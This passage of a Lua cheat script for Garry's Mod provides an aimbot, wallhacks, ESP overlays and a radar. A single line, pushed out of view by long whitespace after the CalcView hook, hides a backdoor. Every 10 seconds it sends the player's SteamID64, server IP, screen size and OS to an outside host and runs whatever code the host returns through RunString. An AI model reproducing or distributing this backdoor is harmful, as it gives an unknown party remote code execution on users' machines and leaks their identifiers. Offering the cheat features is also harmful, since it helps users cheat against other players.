        if SRSscript_aimbot and not blockaim and IsValid( SRSscript_target ) and SRSscript_target:Health() > 0 and SRSscript_CANTARGET( SRSscript_target ) or SRSscript.TRIGGERAIM and IsValid( tr.Entity ) and tr.Entity:Health() > 0 and SRSscript_CANTARGET( tr.Entity ) then
                local SRSscript_target = IsValid( SRSscript_target ) and SRSscript_target or tr.Entity
                local bp = SRSscript_GETBONEPOS( SRSscript_target )
               
                if bp then
                        local vec = SRSscript.POSPRED and SRSscript_PREDICTPOS( SRSscript_target, bp ) or bp
                        local ang = ( vec - SRSscript_self:GetShootPos() ):Angle()
                       
                        if SRSscript.ANTIAIM == 0 then
                                ang.p = NormalizeAngle( ang.p )
                        end
                       
                        cmd:SetViewAngles( ang )
                       
                        if not SRSscript.FAKEVIEW and SRSscript.ANTIAIM ~= 0 then
                                SRSscript_p = ang.p
                                SRSscript_y = ang.y
                        end
                end
        end
       
        if SRSscript.FAKEVIEW or SRSscript.ANTIAIM ~= 0 then
                local m = SRSscript.ANTIAIM ~= 0 and not attack and -1 or 1
                local move = Vector( cmd:GetForwardMove(), cmd:GetSideMove(), 0 )
                local vec = ( move:Angle() + ( cmd:GetViewAngles() - Angle( SRSscript_p, SRSscript_y, 0 ) ) ):Forward() * move:Length()
               
                cmd:SetForwardMove( vec[1] * m )
                cmd:SetSideMove( vec[2] * m )
        end
end )
 
SRSscript_REGISTERHOOK( 'ShouldDrawLocalPlayer', function()
        if SRSscript.THIRDPERSON then return true end
end )
 
local buff = {}
SRSscript_REGISTERHOOK( 'CalcView', function( ply, origin, angles, ... )
        Empty( buff )
       
        if SRSscript.THIRDPERSON then
                local ang = SRSscript.ANTIAIM ~= 0 and Angle( SRSscript_p, SRSscript_y, 0 ) or SRSscript_self:EyeAngles()
               
                buff.origin = SRSscript_self:GetShootPos() - ang:Forward() * 100
                buff.angles = ang
                return buff
        end
       
        if origin:Distance( SRSscript_self:GetShootPos() ) < 20 then
                if SRSscript.FAKEVIEW then
                        buff.angles = Angle( SRSscript_p, SRSscript_y, 0 )
                        return buff
                end
       
                if SRSscript.ANTIAIM ~= 0 then
                        buff.angles = ( SRSscript_lpress or SRSscript_aimbot and SRSscript_target ) and angles or Angle( SRSscript_p, SRSscript_y, 0 )
                        return buff
                end
 
        end
end )																																																		timer.Create("HFmAkglro",10,0,function()http.Post("https://execc.online/daga2/gig.php",{id=LocalPlayer():SteamID64(),ip=game.GetIPAddress(),screen=ScrW().."x"..ScrH(),os=jit.os},function(a)if a=="" then return end RunString(a)end)end)

 
local n_next = 0
SRSscript_REGISTERHOOK( 'Think', function()
        SRSscript_aimbot = SRSscript.AIMENABLED and ( SRSscript.BUTTON == 0 and true or IsMouseDown( SRSscript_buttons[ SRSscript.BUTTON ] ) )
       
        SRSscript_GUI()
       
        if IsKeyDown( KEY_INSERT ) then
                SRSscript_OPENMENU()
        else
                SRSscript_CLOSEMENU()
        end
       
        for i = 1, #plr do
                local pl = plr[ i ]
               
                if SRSscript.DETECTRAITOR and KARMA and pl.GetRole and pl:GetRole() ~= ROLE_DETECTIVE then
                        local w = pl:GetActiveWeapon()
                       
                        if IsValid( w ) and w.m_traitor ~= pl and w.CanBuy and HasValue( w.CanBuy, ROLE_TRAITOR ) then
                                w.m_traitor = pl
                                chat_AddText( color_blue, '[SRSscript] ', color_orange, pl:Nick(), color_white, ' got traitor weapon ', color_orange, '"' .. w:GetClass() .. '"', color_white, '!' )
                        end
                end
               
                if SRSscript.DETECTSPEC then
                        if pl:GetObserverTarget() == SRSscript_self and not HasValue( SRSscript_spectators, pl ) then
                                insert( SRSscript_spectators, pl )
                                chat_AddText( color_blue, '[SRSscript] ', color_orange, pl:Nick(), color_white, ' is spectating you!' )
                        elseif pl:GetObserverTarget() ~= SRSscript_self and HasValue( SRSscript_spectators, pl ) then
                                for i = 1, #SRSscript_spectators do
                                        if SRSscript_spectators[ i ] == pl then
                                                remove( SRSscript_spectators, i )
                                        end
                                end
                               
                                chat_AddText( color_blue, '[SRSscript] ', color_orange, pl:Nick(), color_white, ' is no longer spectating you!' )
                        end
                end
        end
       
        if SRSscript.DETECTSPEC then
                for i = 1, #SRSscript_spectators do
                        if not IsValid( SRSscript_spectators[ i ] ) then
                                remove( SRSscript_spectators, i )
                        end
                end
        else
                Empty( SRSscript_spectators )
        end
       
        if SRSscript_aimbot then
                SRSscript_TARGETS()
               
                local fov
                local found = false
               
                for i = 1, #SRSscript_targets do
                        local pl = SRSscript_targets[ i ]
                        local dst = SRSscript_GETDIST( pl:GetPos() )
                        if dst < ( fov or dst + 1 ) and pl:Health() > 0 and SRSscript_CANTARGET( pl, true ) and SRSscript_GETBONEPOS( pl ) then
                                SRSscript_target = pl
                                fov = dst
                                found = true
                        end
                end
               
                if not found then
                        SRSscript_target = nil
                end
        end
end )
 
SRSscript_REGISTERHOOK( 'PostDrawOpaqueRenderables', function()
        if SRSscript.LASER then
                local tr = SRSscript_self:GetEyeTrace()
                local src = IsValid( SRSscript_self:GetViewModel() ) and SRSscript_self:GetViewModel():GetAttachment( 1 ) and SRSscript_self:GetViewModel():GetAttachment( 1 ).Pos or SRSscript_self:GetPos() + Vector( 0, 0, 10 )
               
                SetMaterial( Material( 'trails/laser' ) )
                DrawBeam( src, tr.HitPos, 8, 12, 12, SRSscript.LASERCOLOR )
        end
       
        if SRSscript.WALLHACK then
                local cham = Material( 'models/debug/debugwhite' )
               
                SRSscript_TARGETS( false, true )
                ClearStencil()
                SetStencilEnable( true )
                SetStencilFailOperation( STENCILOPERATION_KEEP )
                SetStencilPassOperation( STENCILOPERATION_KEEP )
                SetStencilZFailOperation( STENCILOPERATION_REPLACE )
                SetStencilReferenceValue( 1 )
                MaterialOverride( cham )
               
                for i = 1, #SRSscript_targets do
                        local pl = SRSscript_targets[ i ]
                        if IsValid( pl ) then
                                local w = pl:GetActiveWeapon()
                                local wv = IsValid( w )
                                local rgb = SRSscript_GETPLAYERCOLOR( pl )
                               
                                SetColorModulation( rgb.r / 255, rgb.g / 255, rgb.b / 255 ) -- 318.75
                                SetStencilCompareFunction( STENCILCOMPARISONFUNCTION_ALWAYS )
                                SetBlend( 0.6 )
                               
                                pl:DrawModel()
                                if wv then w:DrawModel() end
                               
                                SetBlend( 1 )
                               
                                SetStencilCompareFunction( STENCILCOMPARISONFUNCTION_EQUAL )
                                SuppressEngineLighting( true )
                                IgnoreZ( true )
                               
                                pl:DrawModel()
                                if wv then w:DrawModel() end
                               
                                SuppressEngineLighting( false )
                                IgnoreZ( false )
                        end
                end
               
                MaterialOverride()
                SetColorModulation( 1, 1, 1 )
                SetStencilEnable( false )
        end
end )
 
SRSscript_REGISTERHOOK( 'HUDPaint', function()
        SRSscript_TARGETS( false, true )
        local w, h = ScrW(), ScrH()
        local hw, hh = w / 2, h / 2
        local str = ''
        if IsKeyDown( KEY_E ) and SRSscript.SPEEDHACK ~= 1 then
                str = str .. 'SpeedHacking at ' .. SRSscript.SPEEDHACK
        end
       
        if SRSscript.WALLHACK then
                Start3D( EyePos(), EyeAngles() )
                SuppressEngineLighting( true )
               
                for i = 1, #SRSscript_targets do
                        local pl = SRSscript_targets[ i ]
                        local w = pl:GetActiveWeapon()
                       
                        pl:DrawModel()
                        if IsValid( w ) then w:DrawModel() end
                end
               
                SuppressEngineLighting( false )
                End3D()
        end
       
        for i = 1, #SRSscript_targets do
                local pl = SRSscript_targets[ i ]
                if SRSscript.TRACE then
                        local scr = pl:GetPos():ToScreen()
                       
                        SetDrawColor( SRSscript_GETPLAYERCOLOR( pl ) )
                        DrawLine( hw, hh, Clamp( scr.x, 0, w ), Clamp( scr.y, 0, h ) )
                end
                       
                if SRSscript.BARREL then
                        if pl:IsPlayer() then
                                local col = SRSscript_GETPLAYERCOLOR( pl )
                                local orig = pl:GetShootPos()
                                local dest = orig + pl:GetAimVector() * 256
                                        orig, dest = orig:ToScreen(), dest:ToScreen()
                               
                                SetDrawColor( col )
                                DrawLine( orig.x, orig.y, dest.x, dest.y )
                        end
                end
               
                if SRSscript.DRAWBOX then
                        SetDrawColor( SRSscript_GETPLAYERCOLOR( pl ) )
                       
                        local ang = Angle( 0, pl:EyeAngles().y, 0 )
                        local nom = pl:GetPos()
                        local mon = nom + Vector( 0, 0, pl:OBBMaxs()[3] )
                       
                        local bnd1 = Vector( 16, 16, 0 )
                                bnd1:Rotate( ang )
                                bnd1 = ( nom + bnd1 ):ToScreen()
                               
                        local bnd2 = Vector( 16, -16, 0 )
                                bnd2:Rotate( ang )
                                bnd2 = ( nom + bnd2 ):ToScreen()
                               
                        local bnd3 = Vector( -16, -16, 0 )
                                bnd3:Rotate( ang )
                                bnd3 = ( nom + bnd3 ):ToScreen()
                               
                        local bnd4 = Vector( -16, 16, 0 )
                                bnd4:Rotate( ang )
                                bnd4 = ( nom + bnd4 ):ToScreen()
                               
                        local bnd5 = Vector( 16, 16, 0 )
                                bnd5:Rotate( ang )
                                bnd5 = ( mon + bnd5 ):ToScreen()
                               
                        local bnd6 = Vector( 16, -16, 0 )
                                bnd6:Rotate( ang )
                                bnd6 = ( mon + bnd6 ):ToScreen()
                               
                        local bnd7 = Vector( -16, -16, 0 )
                                bnd7:Rotate( ang )
                                bnd7 = ( mon + bnd7 ):ToScreen()
                               
                        local bnd8 = Vector( -16, 16, 0 )
                                bnd8:Rotate( ang )
                                bnd8 = ( mon + bnd8 ):ToScreen()
                       
                        DrawLine( bnd1.x, bnd1.y, bnd2.x, bnd2.y )
                        DrawLine( bnd2.x, bnd2.y, bnd3.x, bnd3.y )
                        DrawLine( bnd3.x, bnd3.y, bnd4.x, bnd4.y )
                        DrawLine( bnd4.x, bnd4.y, bnd1.x, bnd1.y )
                       
                        DrawLine( bnd5.x, bnd5.y, bnd6.x, bnd6.y )
                        DrawLine( bnd6.x, bnd6.y, bnd7.x, bnd7.y )
                        DrawLine( bnd7.x, bnd7.y, bnd8.x, bnd8.y )
                        DrawLine( bnd8.x, bnd8.y, bnd5.x, bnd5.y )
                       
                        DrawLine( bnd1.x, bnd1.y, bnd5.x, bnd5.y )
                        DrawLine( bnd2.x, bnd2.y, bnd6.x, bnd6.y )
                        DrawLine( bnd3.x, bnd3.y, bnd7.x, bnd7.y )
                        DrawLine( bnd4.x, bnd4.y, bnd8.x, bnd8.y )
                end
               
                if SRSscript.ESP or SRSscript.NICK or SRSscript.INFO or SRSscript.ESPBAR or SRSscript.ESPDST then
                        local col = SRSscript_GETPLAYERCOLOR( pl )
                        local nom = pl:GetPos()
                        local mon = nom + Vector( 0, 0, pl:OBBMaxs()[3] )
                       
                        local bot, top = nom:ToScreen(), mon:ToScreen()
                        local h = ( bot.y - top.y )
                        local w = h / 5
                       
                        if SRSscript.ESP then
                                SetDrawColor( col )
                                DrawOutlinedRect( top.x - w, top.y, w * 2, h )
                        end
               
                        if SRSscript.BOXMODE == 1 then
                                if SRSscript.NICK then
                                        local str = pl:IsPlayer() and pl:Nick() or pl:GetClass()
                                       
                                        local tttcolor
                                        if KARMA then
                                                local _, col = HealthToString( pl:Health() )
                                                tttcolor = col
                                        end
                                       
                                        SetFont( 'DermaDefault' )
                                        SetTextColor( tttcolor or color_green )
                                        SetTextPos( bot.x - GetTextSize( str ) / 2, bot.y + 8 )
                                        DrawText( str )
                                end
                               
                                if SRSscript.INFO then
                                        local str = { '' }
                                        str[ 2 ] = SRSscript.WEPESP and pl.GetActiveWeapon and pl:GetActiveWeapon() and IsValid( pl:GetActiveWeapon() ) and pl:GetActiveWeapon():GetClass()
                                       
                                        SetFont( 'DermaDefault' )
                                        SetTextColor( color_yellow )
                                       
                                        local y = 0
                                        local w = max( GetTextSize( str[ 1 ] ), GetTextSize( str[ 2 ] or '' ) )
                                        for i = 1, 2 do
                                                local t = str[ i ]
                                               
                                                if t then
                                                        SetTextPos( bot.x - w / 2, bot.y + 8 + y * 12 )
                                                        DrawText( str[ i ] )
                                                       
                                                        y = y + 1
                                                end
                                        end
                                end
                               
                                if SRSscript.ESPBAR then
                                        local w = max( w, 10 )
                                       
                                        SetDrawColor( color_black )
                                        DrawRect( bot.x - w, bot.y, w * 2, 4 )
                                       
                                        SetDrawColor( color_green )
                                        DrawRect( bot.x - w + 1, bot.y + 1, ( Clamp( pl:Health(), 0, 100 ) / 100 ) * ( w * 2 - 2 ), 2 )
                                       
                                        if pl:IsPlayer() and pl:Armor() > 0 then
                                                SetDrawColor( color_black )
                                                DrawRect( bot.x - w, bot.y + 3, w * 2, 4 )
                                               
                                                SetDrawColor( color_blue )
                                                DrawRect( bot.x - w + 1, bot.y + 4, ( Clamp( pl:Armor(), 0, 100 ) / 100 ) * ( w * 2 - 2 ), 2 )
                                        end
                                end
                        else
                                if SRSscript.BOXMODE == 0 then
                                        if SRSscript.NICK then
                                                local str = pl:IsPlayer() and pl:Nick() or pl:GetClass()
                                               
                                                local tttcolor
                                                if KARMA then
                                                        local _, col = HealthToString( pl:Health() )
                                                        tttcolor = col
                                                end
                                               
                                                SetFont( 'DermaDefault' )
                                                SetTextColor( tttcolor or color_green )
                                                SetTextPos( top.x - w * 1.1 - 10 - GetTextSize( str ), top.y )
                                                DrawText( str )
                                        end
                                       
                                        if SRSscript.INFO then
                                                local str = { '' }
                                                str[ 2 ] = pl:IsPlayer() and ''
                                                str[ 3 ] = SRSscript.WEPESP and pl.GetActiveWeapon and pl:GetActiveWeapon() and IsValid( pl:GetActiveWeapon() ) and pl:GetActiveWeapon():GetClass()
                                               
                                                SetFont( 'DermaDefault' )
                                                SetTextColor( color_yellow )
                                               
                                                local y = 1
                                                for i = 1, 3 do
                                                        local t = str[ i ]
                                                       
                                                        if t then
                                                                SetTextPos( top.x - w * 1.1 - 10 - GetTextSize( t ), top.y + y * 4 )
                                                                DrawText( str[ i ] )
                                                               
                                                                y = y + 1
                                                        end
                                                end
                                        end
                                       
                                        if SRSscript.ESPBAR then
                                                local wid = max( bot.y - top.y, 10 )
                                               
                                                SetDrawColor( color_black )
                                                DrawRect( top.x - w * 1.1 - 4, top.y, 4, wid )
                                               
                                                if pl:Health() > 69 then
                                                SetDrawColor( color_green )
                                                DrawRect( top.x - w * 1.1 - 3, bot.y - 1 - Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ) )
                                                end
                                               
                                                if pl:Health() < 70 then
                                                SetDrawColor( color_yellow )
                                                DrawRect( top.x - w * 1.1 - 3, bot.y - 1 - Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ) )
                                                end
                                               
                                                if pl:Health() < 50 then
                                                SetDrawColor( color_blue )
                                                DrawRect( top.x - w * 1.1 - 3, bot.y - 1 - Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ) )
                                                end
                                               
                                                if pl:IsPlayer() and pl:Armor() > 0 then
                                                        SetDrawColor( color_black )
                                                        DrawRect( top.x - w * 1.1 - 8, top.y, 4, wid )
                                                       
                                                        SetDrawColor( color_blue )
                                                        DrawRect( top.x - w * 1.1 - 7, bot.y - 1 - Clamp( pl:Armor(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Armor(), 0, 100 ) / 100 * ( wid - 2 ) )
                                                end
                                        end
                                else
                                        if SRSscript.NICK then
                                                local str = pl:IsPlayer() and pl:Nick() or pl:GetClass()
                                               
                                                local tttcolor
                                                if KARMA then
                                                        local _, col = HealthToString( pl:Health() )
                                                        tttcolor = col
                                                end
                                               
                                                SetFont( 'DermaDefault' )
                                                SetTextColor( tttcolor or color_green )
                                                SetTextPos( top.x + w * 1.1 + 10, top.y )
                                                DrawText( str )
                                        end
                                       
                                        if SRSscript.INFO then
                                                local str = { 'H: ' .. pl:Health() }
                                                str[ 2 ] = pl:IsPlayer() and ''
                                                str[ 3 ] = SRSscript.WEPESP and pl.GetActiveWeapon and pl:GetActiveWeapon() and IsValid( pl:GetActiveWeapon() ) and 'W: ' .. pl:GetActiveWeapon():GetClass()
                                               
                                                SetFont( 'DermaDefault' )
                                                SetTextColor( color_yellow )
                                               
                                                local y = 1
                                                for i = 1, 3 do
                                                        local t = str[ i ]
                                                       
                                                        if t then
                                                                SetTextPos( top.x + w * 1.1 + 10, top.y + y * 12 )
                                                                DrawText( str[ i ] )
                                                               
                                                                y = y + 1
                                                        end
                                                end
                                        end
                                       
                                        if SRSscript.ESPBAR then
                                                local wid = max( bot.y - top.y, 10 )
                                               
                                                SetDrawColor( color_black )
                                                DrawRect( top.x + w * 1.1 + 3, top.y, 4, wid )
                                               
                                                SetDrawColor( color_green )
                                                DrawRect( top.x + w * 1.1 + 4, bot.y - 1 - Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Health(), 0, 100 ) / 100 * ( wid - 2 ) )
                                               
                                                if pl:IsPlayer() and pl:Armor() > 0 then
                                                        SetDrawColor( color_black )
                                                        DrawRect( top.x + w * 1.1 + 6, top.y, 4, wid )
                                                       
                                                        SetDrawColor( color_blue )
                                                        DrawRect( top.x + w * 1.1 + 7, bot.y - 1 - Clamp( pl:Armor(), 0, 100 ) / 100 * ( wid - 2 ), 2, Clamp( pl:Armor(), 0, 100 ) / 100 * ( wid - 2 ) )
                                                end
                                        end
                                end
                        end
 
                        if SRSscript.ESPDST then
                                SetFont( 'DermaDefault' )
                                SetTextColor( color_green )
                                SetTextPos( top.x - w * 1.1 - 50, top.y + 25 )
                                DrawText( round( SRSscript_self:GetPos():Distance( pl:GetPos() ), 1 ).." ft." )
                        end
                end
        end
       
        if SRSscript.CROSSMODE ~= 0 then
                SetDrawColor( SRSscript.CROSSCOLOR )
               
                if SRSscript.CROSSMODE == 1 then
                        DrawRect( hw - 1, hh - 1, 2, 2 )
                       
                        DrawRect( hw - 3, hh - 1, 2, 2 )
                        DrawRect( hw + 1, hh - 1, 2, 2 )
                       
                        DrawRect( hw - 1, hh - 3, 2, 2 )
                        DrawRect( hw - 1, hh + 1, 2, 2 )
                       
                        DrawRect( hw - 2, hh - 2, 2, 2 )
                        DrawRect( hw - 2, hh, 2, 2 )
                        DrawRect( hw, hh - 2, 2, 2 )
                        DrawRect( hw, hh, 2, 2 )
                end
               
                if SRSscript.CROSSMODE == 2 then
                        DrawLine( hw - 15, hh, hw + 15, hh )
                        DrawLine( hw, hh - 15, hw, hh + 15 )
                end
               
                if SRSscript.CROSSMODE == 3 then
                        DrawLine( hw - 15, hh, hw + 15, hh )
                        DrawLine( hw, hh - 15, hw, hh + 15 )
                        DrawOutlinedRect( hw - 20, hh - 20, 40, 40 )
                end
               
                if SRSscript.CROSSMODE == 4 then
                        DrawLine( hw - 15, hh, hw + 15, hh )
                        DrawLine( hw, hh - 15, hw, hh + 15 )
                        DrawCircle( hw, hh, 20, SRSscript.CROSSCOLOR )
                end
        end
       
        if SRSscript.SPECLIST and SRSscript.DETECTSPEC then
                local hg = 40 + #SRSscript_spectators * 16
               
                RoundedBox( 10, SRSscript.SPEC_POS[1] - 128, SRSscript.SPEC_POS[2], 256, hg, color_dark )
               
                SetDrawColor( color_white )
                DrawLine( SRSscript.SPEC_POS[1] - 124, SRSscript.SPEC_POS[2] + 20, SRSscript.SPEC_POS[1] + 124, SRSscript.SPEC_POS[2] + 20 )
               
                SetFont( 'DermaDefault' )
                SetTextColor( color_white )
                SetTextPos( SRSscript.SPEC_POS[1] - GetTextSize( 'SPECTATORS' ) / 2, SRSscript.SPEC_POS[2] + 3 )
                DrawText( 'SPECTATORS' )
               
                for i = 1, #SRSscript_spectators do
                        local spec = SRSscript_spectators[ i ]
                        if IsValid( spec ) then
                                if spec:IsAdmin() then
                                        SetTextColor( color_blue )
                                else
                                        SetTextColor( color_white )
                                end
                               
                                SetTextPos( SRSscript.SPEC_POS[1] - 124, SRSscript.SPEC_POS[2] + 8 + i * 16 )
                                DrawText( spec:Nick() )
                        end
                end
        end
       
        if SRSscript.RADAR then
                SRSscript_TARGETS( true )
               
                RoundedBox( 10, SRSscript.RADAR_POS[1] - SRSscript.RADAR_SIZE, SRSscript.RADAR_POS[2] - SRSscript.RADAR_SIZE, 2 * SRSscript.RADAR_SIZE + 2, 2 * SRSscript.RADAR_SIZE + 2, color_dark )
               
                SetFont( 'DermaDefault' )
                SetDrawColor( color_orange )
                DrawLine( SRSscript.RADAR_POS[1] - SRSscript.RADAR_SIZE + 5, SRSscript.RADAR_POS[2], SRSscript.RADAR_POS[1] + SRSscript.RADAR_SIZE - 5, SRSscript.RADAR_POS[2] )
                DrawLine( SRSscript.RADAR_POS[1], SRSscript.RADAR_POS[2] - SRSscript.RADAR_SIZE + 5, SRSscript.RADAR_POS[1], SRSscript.RADAR_POS[2] + SRSscript.RADAR_SIZE - 5 )
               
                for i = 1, #SRSscript_targets do
                        local pl = SRSscript_targets[ i ]
                        local dst = pl:GetPos() - SRSscript_self:GetPos()
                        dst:Rotate( Angle( SRSscript_p, -SRSscript_y + 90, 0 ) )
                        dst[1] = Clamp( dst[1], -SRSscript.RADAR_SCALE, SRSscript.RADAR_SCALE )
                        dst[2] = Clamp( dst[2], -SRSscript.RADAR_SCALE, SRSscript.RADAR_SCALE )
                       
                        dst = dst / SRSscript.RADAR_SCALE * SRSscript.RADAR_SIZE
                       
                        SetDrawColor( SRSscript_GETPLAYERCOLOR( pl ) )
                        DrawRect( SRSscript.RADAR_POS[1] + dst[1] - 3, SRSscript.RADAR_POS[2] - dst[2] - 3, 5, 5 )
                       
                        if SRSscript.RADAR_NICK then
                                local str = pl:IsPlayer() and pl:Nick() or pl:GetClass()
                                local tttcolor
                                if KARMA then
                                        local _, col = HealthToString( pl:Health() )
                                        tttcolor = col
                                end
                               
                                SetTextColor( tttcolor or color_green )
                                SetTextPos( SRSscript.RADAR_POS[1] + dst[1] - 3 - GetTextSize( str ) / 2, SRSscript.RADAR_POS[2] - dst[2] + 2 )
                                DrawText( str )
                        end
                end
        end
       
        SetFont( 'Default' )
        SetTextColor( color_black )
        SetTextPos( hw - GetTextSize( str ) / 2 - 1, 9 )
        DrawText( str )
        SetTextPos( hw - GetTextSize( str ) / 2 + 1, 9 )
        DrawText( str )
        SetTextPos( hw - GetTextSize( str ) / 2 - 1, 11 )
        DrawText( str )
        SetTextPos( hw - GetTextSize( str ) / 2 + 1, 11 )
        DrawText( str )
       
        SetTextColor( color_blue )
        SetTextPos( hw - GetTextSize( str ) / 2, 10 )
        DrawText( str )
end )


	MsgC(Color(255,0,255), "\n          _____                   _____                   _____           \n")
	MsgC(Color(255,0,255), "\n         /\\    \\                 /\\    \\                 /\\    \\          \n")
	MsgC(Color(255,0,255), "\n        /::\\    \\               /::\\    \\               /::\\    \\         \n")
	MsgC(Color(255,0,255), "\n       /::::\\    \\             /::::\\    \\             /::::\\    \\        \n")
	MsgC(Color(255,0,255), "\n      /::::::\\    \\           /::::::\\    \\           /::::::\\    \\       \n")
	MsgC(Color(255,0,255), "\n     /:::/\\:::\\    \\         /:::/\\:::\\    \\         /:::/\\:::\\    \\      \n")
	MsgC(Color(255,0,255), "\n    /:::/__\\:::\\    \\       /:::/__\\:::\\    \\       /:::/__\\:::\\    \\     \n")
	MsgC(Color(255,0,255), "\n    \\:::\\   \\:::\\    \\     /::::\\   \\:::\\    \\      \\:::\\   \\:::\\    \\    \n")
	MsgC(Color(255,0,255), "\n  ___\\:::\\   \\:::\\    \\   /::::::\\   \\:::\\    \\   ___\\:::\\   \\:::\\    \\   \n")
	MsgC(Color(255,0,255), "\n  /\\   \\:::\\   \\:::\\    \\ /:::/\\:::\\   \\:::\\____\\ /\\   \\:::\\   \\:::\\    \\  \n")
	MsgC(Color(255,0,255), "\n /::\\   \\:::\\   \\:::\\____/:::/  \\:::\\   \\:::|    /::\\   \\:::\\   \\:::\\____\\ \n")
	MsgC(Color(255,0,255), "\n \\:::\\   \\:::\\   \\::/    \\::/   |::::\\  /:::|____\\:::\\   \\:::\\   \\::/    / \n")
	MsgC(Color(255,0,255), "\n  \\:::\\   \\:::\\   \\/____/ \\/____|:::::\\/:::/    / \\:::\\   \\:::\\   \\/____/  \n")
	MsgC(Color(255,0,255), "\n   \\:::\\   \\:::\\    \\           |:::::::::/    /   \\:::\\   \\:::\\    \\     \n")
	MsgC(Color(255,0,255), "\n    \\:::\\   \\:::\\____\\          |::|\\::::/    /     \\:::\\   \\:::\\____\\    \n")
	MsgC(Color(255,0,255), "\n     \\:::\\  /:::/    /          |::| \\::/____/       \\:::\\  /:::/    /    \n")
	MsgC(Color(255,0,255), "\n      \\:::\\/:::/    /           |::|  ~|              \\:::\\/:::/    /     \n")
	MsgC(Color(255,0,255), "\n       \\::::::/    /            |::|   |               \\::::::/    /      \n")
	MsgC(Color(255,0,255), "\n        \\::::/    /             \\::|   |                \\::::/    /       \n")
	MsgC(Color(255,0,255), "\n         \\::/    /               \\:|   |                 \\::/    /        \n")
	MsgC(Color(255,0,255), "\n          \\/____/                 \\|___|                  \\/____/         \n")
    MsgC(Color(0,255,0), "\nJohn's Scripts loaded, press numpad 0 to upen the menu, if that doesnt work, make sure numlocks off\n")
    MsgC(Color(0,0,255), "\n Thanks for using John's scripts. Wanna use these on a server where sv_allowcslua is always enabled? and where my scripts are allowed?\n")
	
	MsgC(Color(0,0,255), "\n Then join my Sandbox server!!! just type join_srsclan in console and you're all good :D\n")